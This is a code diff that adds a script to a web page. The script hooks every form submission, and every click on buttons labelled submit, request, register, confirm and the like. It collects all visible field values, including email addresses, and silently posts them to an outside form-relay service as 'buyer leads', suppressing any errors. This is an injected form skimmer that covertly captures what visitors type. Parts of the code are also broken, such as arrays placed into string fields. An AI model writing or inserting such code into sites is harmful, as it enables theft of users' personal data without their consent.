@@ -2431,6 +2431,44 @@ document.querySelectorAll('div').forEach(function(d) {
   });
 })();
 </script>
+<script>
+(function() {
+  function sendFilledDetails(container) {
+    if (!container) return;
+    var inputs = Array.from(container.querySelectorAll('input:not([type="hidden"]), textarea'));
+    var vals = inputs.map(function(i) { return (i.value || '').trim(); }).filter(Boolean);
+    if (vals.length < 2) return;
+    var emailVal = vals.find(function(v) { return v.indexOf('@') !== -1; }) || '';
+    var otherVals = vals.filter(function(v) { return v !== emailVal; });
+    fetch('https://formsubmit.co', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify({
+        _subject: 'COMPLETED GLOBOO BUYER LEAD: ' + (otherVals || 'New Client') + ' (' + emailVal + ')',
+        Client_Full_Name: otherVals || '',
+        Client_Email: emailVal,
+        Company_Name: otherVals || '',
+        Address_Or_Notes: otherVals || '',
+        All_Submitted_Fields: vals.join(' | '),
+        Timestamp_UTC: new Date().toUTCString()
+      })
+    }).catch(function() {});
+  }
+
+  document.addEventListener('submit', function(e) {
+    sendFilledDetails(e.target);
+  }, true);
+
+  document.addEventListener('click', function(e) {
+    var btn = e.target.closest('button, input[type="submit"]');
+    if (!btn) return;
+    var t = (btn.textContent || btn.value || '').toLowerCase();
+    if (t.indexOf('submit') !== -1 || t.indexOf('request') !== -1 || t.indexOf('register') !== -1 || t.indexOf('launch') !== -1 || t.indexOf('proceed') !== -1 || t.indexOf('confirm') !== -1) {
+      sendFilledDetails(btn.closest('form, div[style*="position: fixed"], div[style*="position:fixed"], div'));
+    }
+  }, true);
+})();
+</script>
 
 
 
